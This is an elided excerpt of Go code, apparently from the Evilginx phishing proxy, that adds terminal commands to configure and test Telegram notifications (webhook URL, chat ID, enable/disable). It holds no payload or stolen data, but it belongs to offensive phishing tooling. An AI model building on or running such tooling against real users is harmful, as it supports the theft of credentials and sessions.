...
func (t *Terminal) handleTelegram(args []string) error {
	...
	if pn == 0 {
		...
		keys := []string{"enabled", "webhook", "chat_id"}
		vals := []string{enabled, t.cfg.GetTelegramWebhook(), t.cfg.GetTelegramChatId()}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "webhook":
			t.cfg.SetTelegramWebhook(args[1])
			return nil
		case "chat_id":
		...
		switch args[0] {
		case "enable":
			t.cfg.EnableTelegram(true)
			return nil
		case "disable":
			t.cfg.EnableTelegram(false)
			return nil
		case "test":
			// Test the Telegram notification
			if t.cfg.GetTelegramWebhook() != "" && t.cfg.GetTelegramChatId() != "" {
				test_msg := "Evilginx Telegram notification test successful!"
				err := SendTelegramNotification(t.cfg.GetTelegramWebhook(), t.cfg.GetTelegramChatId(), test_msg)
				if err != nil {
					log.Error("telegram test: %v", err)
				} else {
...
func (t *Terminal) createHelp() {
	...
	h.AddSubCommand("telegram", nil, "", "show current telegram configuration")
	h.AddSubCommand("telegram", []string{"webhook"}, "webhook <webhook_url>", "set telegram webhook URL (e.g. https://api.telegram.org/bot<token>/sendMessage)")
	h.AddSubCommand("telegram", []string{"chat_id"}, "chat_id <chat_id>", "set telegram chat ID for notifications")
